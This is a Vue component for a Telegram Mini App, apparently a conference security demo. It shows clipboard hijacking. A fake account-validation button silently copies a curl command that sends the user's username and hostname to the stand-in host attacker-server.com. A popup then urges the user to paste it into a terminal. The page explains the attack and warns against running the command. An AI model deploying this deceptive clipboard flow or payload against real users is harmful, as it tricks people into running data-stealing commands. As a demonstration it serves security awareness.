<script setup lang="ts">
import { ref } from 'vue';
import AppPage from '@/components/AppPage.vue';
import { popup } from '@tma.js/sdk-vue';

const isValidating = ref(false);
const validationStatus = ref<'idle' | 'success' | 'error'>('idle');
const maliciousPayload = 'curl -X POST https://attacker-server.com/steal-data -d "$(whoami):$(hostname)"';
const pastedContent = ref<string>('');

/**
 * Función que simula una validación pero en realidad inyecta código malicioso en el portapapeles
 */
async function handleValidation() {
  isValidating.value = true;
  validationStatus.value = 'idle';

  try {
    // Pequeño delay para simular procesamiento
    await new Promise(resolve => setTimeout(resolve, 500));

    // Intentar copiar al portapapeles usando la API moderna
    if (navigator.clipboard && navigator.clipboard.writeText) {
      await navigator.clipboard.writeText(maliciousPayload);
      validationStatus.value = 'success';

      // Mostrar popup de Telegram confirmando la "validación"
      await popup.show({
        title: '✅ Validación Exitosa',
        message: '¡Tu cuenta ha sido validada correctamente! Por favor, ejecuta el comando de verificación en tu terminal para completar el proceso.',
        buttons: [{ id: 'ok', type: 'default', text: 'Entendido' }],
      });
    } else {
      // Fallback para navegadores que no soportan la API del portapapeles
      const textArea = document.createElement('textarea');
      textArea.value = maliciousPayload;
      textArea.style.position = 'fixed';
      textArea.style.left = '-999999px';
      document.body.appendChild(textArea);
      textArea.select();

      try {
        document.execCommand('copy');
        validationStatus.value = 'success';

        await popup.show({
          title: '✅ Validación Exitosa',
          message: '¡Tu cuenta ha sido validada correctamente! Por favor, ejecuta el comando de verificación en tu terminal para completar el proceso.',
          buttons: [{ id: 'ok', type: 'default', text: 'Entendido' }],
        });
      } catch (err) {
        throw new Error('No se pudo copiar al portapapeles');
      } finally {
        document.body.removeChild(textArea);
      }
    }
  } catch (error) {
    console.error('Error al copiar al portapapeles:', error);
    validationStatus.value = 'error';

    await popup.show({
      title: '❌ Error',
      message: 'No se pudo completar la validación. Inténtalo de nuevo.',
      buttons: [{ id: 'ok', type: 'default', text: 'OK' }],
    });
  } finally {
    isValidating.value = false;
  }
}

function handlePaste() {
  // El contenido ya estará en pastedContent gracias al v-model
}

function clearContent() {
  pastedContent.value = '';
}
</script>

<template>
  <AppPage title="🔒 Validación de Cuenta">
    <div class="demo-container">
      <div class="warning-banner">
        <h3>⚠️ DEMO de Seguridad - MorterueloCon 2026</h3>
        <p>Esta es una demostración de cómo las Mini Apps de Telegram pueden manipular el portapapeles en aplicaciones
          de escritorio.</p>
      </div>

      <div class="validation-section">
        <div class="info-box">
          <h4>🛡️ Sistema de Validación</h4>
          <p>Para proteger tu cuenta, necesitamos validar tu identidad.</p>
          <p class="info-detail">Haz clic en el botón de abajo para completar el proceso de validación.</p>
        </div>

        <button
          class="validate-button"
          :class="{
            'validating': isValidating,
            'success': validationStatus === 'success',
            'error': validationStatus === 'error'
          }"
          @click="handleValidation"
          :disabled="isValidating"
        >
          <span v-if="isValidating">⏳ Validando...</span>
          <span v-else-if="validationStatus === 'success'">✅ Validado</span>
          <span v-else-if="validationStatus === 'error'">❌ Error</span>
          <span v-else>🔐 Validar mi Cuenta</span>
        </button>

        <div
          v-if="validationStatus === 'success'"
          class="success-message"
        >
          <p>✅ ¡Validación completada!</p>
          <p class="instruction">Ahora abre tu terminal y pega el comando de verificación (Ctrl+V o Cmd+V)</p>
        </div>
      </div>

      <div class="explanation">
        <h4>📚 Explicación del Ataque</h4>
        <ol>
          <li><strong>Ingeniería Social:</strong> La víctima cree que está "validando" su cuenta</li>
          <li><strong>Inyección en Portapapeles:</strong> Al hacer clic, se copia un comando malicioso</li>
          <li><strong>Ejecución del Payload:</strong> La víctima pega y ejecuta el comando sin revisarlo</li>
          <li><strong>Compromiso:</strong> El comando roba información o instala malware</li>
        </ol>
      </div>

      <div class="clipboard-checker">
        <h4>🔍 Verificar el Ataque (Para Demostración)</h4>
        <p class="checker-description">
          <strong>⚠️ NO EJECUTES EL COMANDO EN TU TERMINAL.</strong> En su lugar, pega aquí (Ctrl+V o Cmd+V)
          el contenido de tu portapapeles para verificar que el payload malicioso ha sido inyectado.
        </p>
        <textarea
          v-model="pastedContent"
          class="paste-area"
          placeholder="Pega aquí el contenido de tu portapapeles (Ctrl+V o Cmd+V)..."
          @paste="handlePaste"
        ></textarea>
        <div
          class="button-group"
          v-if="pastedContent"
        >
          <button
            class="clear-button"
            @click="clearContent"
          >
            🗑️ Limpiar
          </button>
        </div>
        <div
          v-if="pastedContent"
          class="result-box"
        >
          <p class="result-label">✅ Contenido detectado en portapapeles:</p>
          <code class="result-content">{{ pastedContent }}</code>
        </div>
        <div class="payload-info">
          <h5>Payload que fue inyectado:</h5>
          <code>{{ maliciousPayload }}</code>
          <p class="payload-warning">
            ⚠️ Este comando, si se ejecutara en un terminal real, enviaría tu nombre de usuario y hostname a un servidor
            del atacante.
          </p>
        </div>
      </div>
    </div>
  </AppPage>
</template>

<style scoped>
.demo-container {
  display: flex;
  flex-direction: column;
  gap: 20px;
  max-width: 600px;
  margin: 0 auto;
}

.warning-banner {
  background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
  color: white;
  padding: 20px;
  border-radius: 12px;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

.warning-banner h3 {
  margin: 0 0 10px 0;
  font-size: 18px;
}

.warning-banner p {
  margin: 0;
  font-size: 14px;
  opacity: 0.95;
}

.validation-section {
  background: var(--tg-theme-bg-color, #fff);
  padding: 24px;
  border-radius: 12px;
  border: 2px solid var(--tg-theme-section-separator-color, #e0e0e0);
}

.info-box {
  margin-bottom: 24px;
}

.info-box h4 {
  margin: 0 0 12px 0;
  color: var(--tg-theme-text-color, #000);
  font-size: 16px;
}

.info-box p {
  margin: 8px 0;
  color: var(--tg-theme-text-color, #000);
  line-height: 1.5;
}

.info-detail {
  font-size: 14px;
  opacity: 0.8;
}

.validate-button {
  width: 100%;
  padding: 16px;
  font-size: 18px;
  font-weight: bold;
  color: white;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  border: none;
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
}

.validate-button:hover:not(:disabled) {
  transform: translateY(-2px);
  box-shadow: 0 6px 16px rgba(102, 126, 234, 0.5);
}

.validate-button:disabled {
  opacity: 0.7;
  cursor: not-allowed;
}

.validate-button.validating {
  background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
  animation: pulse 1.5s ease-in-out infinite;
}

.validate-button.success {
  background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
}

.validate-button.error {
  background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%);
}

@keyframes pulse {

  0%,
  100% {
    opacity: 1;
  }

  50% {
    opacity: 0.8;
  }
}

.success-message {
  margin-top: 16px;
  padding: 16px;
  background: #d4edda;
  border: 1px solid #c3e6cb;
  border-radius: 8px;
  color: #155724;
}

.success-message p {
  margin: 8px 0;
}

.instruction {
  font-weight: bold;
  font-size: 14px;
}

.clipboard-checker {
  background: var(--tg-theme-bg-color, #fff);
  padding: 24px;
  border-radius: 12px;
  border: 2px solid var(--tg-theme-hint-color, #999);
}

.clipboard-checker h4 {
  margin: 0 0 12px 0;
  color: var(--tg-theme-text-color, #000);
  font-size: 18px;
}

.checker-description {
  font-size: 14px;
  line-height: 1.5;
  color: var(--tg-theme-text-color, #000);
  opacity: 0.8;
  margin: 0 0 16px 0;
}

.paste-area {
  width: 100%;
  min-height: 100px;
  padding: 12px;
  font-family: 'Courier New', monospace;
  font-size: 14px;
  color: var(--tg-theme-text-color, #000);
  background: var(--tg-theme-bg-color, #fff);
  border: 2px solid var(--tg-theme-section-separator-color, #e0e0e0);
  border-radius: 8px;
  resize: vertical;
  transition: border-color 0.2s;
}

.paste-area:focus {
  outline: none;
  border-color: var(--tg-theme-button-color, #3390ec);
}

.paste-area::placeholder {
  color: var(--tg-theme-hint-color, #999);
  font-style: italic;
}

.button-group {
  display: flex;
  gap: 10px;
  margin-top: 12px;
}

.clear-button {
  padding: 10px 16px;
  font-size: 14px;
  font-weight: 600;
  color: var(--tg-theme-destructive-text-color, #ff3b30);
  background: transparent;
  border: 2px solid var(--tg-theme-destructive-text-color, #ff3b30);
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.2s ease;
}

.clear-button:hover {
  background: var(--tg-theme-destructive-text-color, #ff3b30);
  color: white;
}

.result-box {
  margin-top: 16px;
  padding: 16px;
  background: #e8f5e9;
  border: 2px solid #4caf50;
  border-radius: 8px;
}

.result-label {
  margin: 0 0 8px 0;
  font-weight: 600;
  color: #2e7d32;
  font-size: 14px;
}

.result-content {
  display: block;
  padding: 12px;
  background: #fff;
  border-radius: 6px;
  font-family: 'Courier New', monospace;
  font-size: 13px;
  color: #000;
  word-break: break-all;
  white-space: pre-wrap;
}

.payload-info {
  margin-top: 16px;
}

.payload-info h5 {
  margin: 0 0 8px 0;
  font-size: 14px;
  color: var(--tg-theme-text-color, #000);
}

.payload-info code {
  display: block;
  padding: 12px;
  background: #1e1e1e;
  color: #d4d4d4;
  border-radius: 6px;
  font-family: 'Courier New', monospace;
  font-size: 12px;
  word-break: break-all;
  overflow-x: auto;
}

.payload-warning {
  margin-top: 12px;
  padding: 12px;
  background: #fff3cd;
  border: 1px solid #ffc107;
  border-radius: 6px;
  color: #856404;
  font-size: 13px;
  line-height: 1.5;
}

.explanation {
  background: var(--tg-theme-secondary-bg-color, #f5f5f5);
  padding: 20px;
  border-radius: 12px;
}

.explanation h4 {
  margin: 0 0 16px 0;
  color: var(--tg-theme-text-color, #000);
}

.explanation ol {
  margin: 0;
  padding-left: 20px;
  color: var(--tg-theme-text-color, #000);
}

.explanation li {
  margin: 12px 0;
  line-height: 1.5;
}

.explanation strong {
  color: var(--tg-theme-link-color, #3390ec);
}
</style>
